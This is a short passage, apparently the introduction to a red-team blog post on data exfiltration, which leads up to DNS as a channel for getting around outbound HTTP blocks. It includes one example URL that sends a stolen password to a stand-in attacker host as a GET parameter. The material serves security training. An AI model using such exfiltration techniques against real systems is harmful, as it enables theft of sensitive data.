I"‰<p>Data exfiltration is a key component of any red team/penetration testing assesment. Sometimes itâ€™s as simple as scpâ€™ing the sensitive data over an SSH connection. Other times, however, more sophisticated methods need to be used. One such common method is exfiltrating data through specially crafted URL requests to your public web server, such as placing the sensitive data as a GET parameter (www.evil.com?stolendata=password123). But what if firewall permissions are blocking any outbound HTTP traffic on the victim server? Or has a whitelist of allowed sites and yours isnâ€™t on it (obviously)? Another method is still possible: DNS.</p>
